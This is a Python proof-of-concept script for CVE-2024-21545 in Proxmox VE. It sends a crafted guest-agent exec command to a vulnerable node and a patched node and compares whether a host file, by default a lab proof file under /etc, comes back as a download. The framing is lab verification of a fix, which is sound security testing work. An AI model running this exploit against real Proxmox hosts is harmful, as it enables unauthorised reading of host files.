#!/usr/bin/env python3
"""Real Proxmox VE CVE-2024-21545 two-node comparison client."""

from __future__ import annotations

import argparse
import json
import os
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Mapping


def env_bool(name: str, default: bool) -> bool:
    value = os.environ.get(name)
    if value is None:
        return default
    return value.lower() not in {"0", "false", "no", "off"}


def env_first(*names: str) -> str:
    for name in names:
        value = os.environ.get(name)
        if value:
            return value
    return ""


@dataclass(frozen=True)
class NodeConfig:
    label: str
    env_prefix: str
    url: str
    node: str
    vmid: str
    username: str
    password: str
    api_token: str

    @property
    def api_base(self) -> str:
        return f"{self.url.rstrip('/')}/api2/json"


@dataclass
class HttpResult:
    status: int
    reason: str
    headers: Mapping[str, str]
    body: bytes
    transport_error: str = ""

    @property
    def content_type(self) -> str:
        return self.headers.get("Content-Type", "")


@dataclass
class CompareResult:
    node: NodeConfig
    kind: str
    http: HttpResult
    body_path: Path
    preview: str
    detail: str

    @property
    def downloaded(self) -> bool:
        return self.kind == "download"


def load_node(prefix: str, label: str) -> NodeConfig:
    url = env_first(f"{prefix}_PVE_URL", "PVE_URL")
    node = env_first(f"{prefix}_NODE", "PVE_NODE")
    vmid = env_first(f"{prefix}_VMID", "PVE_VMID")
    username = env_first(f"{prefix}_PVE_USERNAME", "PVE_USERNAME")
    password = env_first(f"{prefix}_PVE_PASSWORD", "PVE_PASSWORD")
    api_token = env_first(f"{prefix}_PVE_API_TOKEN", "PVE_API_TOKEN")

    missing = []
    for name, value in (
        (f"{prefix}_PVE_URL", url),
        (f"{prefix}_NODE", node),
        (f"{prefix}_VMID", vmid),
    ):
        if not value:
            missing.append(name)

    if not api_token and not (username and password):
        missing.append(
            f"{prefix}_PVE_API_TOKEN or {prefix}_PVE_USERNAME/{prefix}_PVE_PASSWORD"
        )

    if missing:
        print(f"Missing settings for {label}: {', '.join(missing)}", file=sys.stderr)
        raise SystemExit(2)

    return NodeConfig(
        label=label,
        env_prefix=prefix,
        url=url,
        node=node,
        vmid=vmid,
        username=username,
        password=password,
        api_token=api_token,
    )


def ssl_context(verify_tls: bool) -> ssl.SSLContext | None:
    if verify_tls:
        return None
    return ssl._create_unverified_context()


def token_header(value: str) -> str:
    if value.startswith("PVEAPIToken="):
        return value
    return f"PVEAPIToken={value}"


def http_request(
    url: str,
    method: str,
    timeout: int,
    verify_tls: bool,
    fields: Mapping[str, str] | None = None,
    headers: Mapping[str, str] | None = None,
) -> HttpResult:
    data = None
    request_headers = {"Accept": "application/json"}
    if headers:
        request_headers.update(headers)

    if fields is not None:
        data = urllib.parse.urlencode(fields).encode("utf-8")
        request_headers["Content-Type"] = "application/x-www-form-urlencoded"

    request = urllib.request.Request(
        url=url,
        data=data,
        headers=request_headers,
        method=method,
    )

    try:
        with urllib.request.urlopen(
            request,
            timeout=timeout,
            context=ssl_context(verify_tls),
        ) as response:
            return HttpResult(
                status=response.status,
                reason=response.reason,
                headers=dict(response.headers.items()),
                body=response.read(),
            )
    except urllib.error.HTTPError as exc:
        return HttpResult(
            status=exc.code,
            reason=exc.reason,
            headers=dict(exc.headers.items()),
            body=exc.read(),
        )
    except urllib.error.URLError as exc:
        return HttpResult(
            status=0,
            reason="transport error",
            headers={},
            body=b"",
            transport_error=str(exc.reason),
        )


def parse_json_response(result: HttpResult) -> dict[str, object] | None:
    try:
        return json.loads(result.body.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError):
        return None


def authenticate(node: NodeConfig, timeout: int, verify_tls: bool) -> dict[str, str]:
    if node.api_token:
        return {"Authorization": token_header(node.api_token)}

    result = http_request(
        url=f"{node.api_base}/access/ticket",
        method="POST",
        timeout=timeout,
        verify_tls=verify_tls,
        fields={"username": node.username, "password": node.password},
    )
    data = parse_json_response(result)
    if result.status != 200 or not isinstance(data, dict):
        print(
            f"{node.label}: authentication failed with HTTP {result.status} {result.reason}",
            file=sys.stderr,
        )
        if result.body:
            print(result.body.decode("utf-8", errors="replace")[:400], file=sys.stderr)
        raise SystemExit(1)

    ticket_data = data.get("data")
    if not isinstance(ticket_data, dict):
        print(f"{node.label}: authentication response did not contain data", file=sys.stderr)
        raise SystemExit(1)

    ticket = str(ticket_data.get("ticket", ""))
    csrf = str(ticket_data.get("CSRFPreventionToken", ""))
    if not ticket or not csrf:
        print(f"{node.label}: authentication response missed ticket or CSRF token", file=sys.stderr)
        raise SystemExit(1)

    return {
        "Cookie": f"PVEAuthCookie={ticket}",
        "CSRFPreventionToken": csrf,
    }


def agent_exec_path(node: NodeConfig) -> str:
    encoded_node = urllib.parse.quote(node.node, safe="")
    encoded_vmid = urllib.parse.quote(str(node.vmid), safe="")
    return f"{node.api_base}/nodes/{encoded_node}/qemu/{encoded_vmid}/agent/exec"


def classify_response(node: NodeConfig, result: HttpResult, output_path: Path) -> CompareResult:
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_bytes(result.body)

    body_text = result.body.decode("utf-8", errors="replace")
    preview = body_text.splitlines()[0][:160] if body_text.splitlines() else ""
    content_type = result.content_type.lower()

    if result.transport_error:
        return CompareResult(
            node=node,
            kind="transport-error",
            http=result,
            body_path=output_path,
            preview=result.transport_error,
            detail="could not reach Proxmox API",
        )

    json_body = parse_json_response(result)
    if "json" in content_type or json_body is not None:
        if result.status >= 400:
            detail = "Proxmox returned a JSON/HTTP error instead of a file download"
            kind = "blocked"
        else:
            detail = "Proxmox returned JSON instead of a file download"
            kind = "json"
        return CompareResult(
            node=node,
            kind=kind,
            http=result,
            body_path=output_path,
            preview=preview,
            detail=detail,
        )

    if 200 <= result.status < 300 and result.body:
        return CompareResult(
            node=node,
            kind="download",
            http=result,
            body_path=output_path,
            preview=preview,
            detail="Proxmox returned a non-JSON body consistent with host-side file download",
        )

    return CompareResult(
        node=node,
        kind="http-error",
        http=result,
        body_path=output_path,
        preview=preview,
        detail="Proxmox returned a non-JSON error response",
    )


def run_probe(
    node: NodeConfig,
    command: str,
    timeout: int,
    verify_tls: bool,
    output_dir: Path,
) -> CompareResult:
    headers = authenticate(node, timeout, verify_tls)
    result = http_request(
        url=agent_exec_path(node),
        method="POST",
        timeout=timeout,
        verify_tls=verify_tls,
        fields={"command": command},
        headers=headers,
    )
    output_file = output_dir / f"{node.env_prefix.lower()}-response.bin"
    return classify_response(node, result, output_file)


def print_result(result: CompareResult) -> None:
    node = result.node
    print()
    print(f"== {node.label} ==")
    print(f"api:       {node.url.rstrip('/')}")
    print(f"vm:        {node.node}/{node.vmid}")
    print(f"http:      {result.http.status} {result.http.reason}")
    print(f"type:      {result.http.content_type or 'unknown'}")
    print(f"download:  {'yes' if result.downloaded else 'no'}")
    print(f"result:    {result.detail}")
    print(f"saved:     {result.body_path}")
    if result.preview:
        print(f"preview:   {result.preview}")


def compare(args: argparse.Namespace) -> int:
    vulnerable = load_node("VULN", "Vulnerable Proxmox node")
    fixed = load_node("FIXED", "Fixed Proxmox node")
    command = f"{args.command_prefix}{args.target_path}"
    output_dir = args.lab_dir / "output"

    print(f"target:    {args.target_path}")
    print(f"command:   {command}")
    print(f"tls:       {'verify' if args.verify_tls else 'insecure lab mode'}")

    vulnerable_result = run_probe(
        vulnerable,
        command,
        args.timeout,
        args.verify_tls,
        output_dir,
    )
    fixed_result = run_probe(
        fixed,
        command,
        args.timeout,
        args.verify_tls,
        output_dir,
    )

    print_result(vulnerable_result)
    print_result(fixed_result)

    failures = []
    if not vulnerable_result.downloaded:
        failures.append("vulnerable node did not return a host-side file download")

    expected = args.expected_substring
    if expected and expected not in vulnerable_result.http.body.decode("utf-8", errors="replace"):
        failures.append("vulnerable node response did not contain TARGET_EXPECTED_SUBSTRING")

    if fixed_result.downloaded:
        failures.append("fixed node also returned a file download")

    if failures:
        print()
        for failure in failures:
            print(f"FAIL: {failure}", file=sys.stderr)
        return 1

    print()
    print(
        "PASS: vulnerable node returned the proof file, while the fixed node "
        "did not return a host-side download."
    )
    return 0


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--lab-dir",
        type=Path,
        default=Path(os.environ.get("LAB_DIR", ".lab")),
        help="Local directory for saved responses.",
    )
    parser.add_argument(
        "--target-path",
        default=os.environ.get("TARGET_PATH", "/etc/cve-2024-21545-proof.txt"),
        help="Host path requested through the patched guest-agent response.",
    )
    parser.add_argument(
        "--expected-substring",
        default=os.environ.get("TARGET_EXPECTED_SUBSTRING", ""),
        help="Optional substring expected in the vulnerable node response.",
    )
    parser.add_argument(
        "--command-prefix",
        default=os.environ.get("COMMAND_PREFIX", "NOTFOUND"),
        help="Trigger prefix used by the qemu-ga lab patch.",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=int(os.environ.get("PVE_TIMEOUT", "20")),
        help="HTTP timeout in seconds.",
    )
    parser.add_argument(
        "--verify-tls",
        action="store_true",
        default=not env_bool("PVE_INSECURE", True),
        help="Verify Proxmox HTTPS certificates. Default is insecure lab mode.",
    )
    return parser.parse_args()


def main() -> int:
    return compare(parse_args())


if __name__ == "__main__":
    raise SystemExit(main())
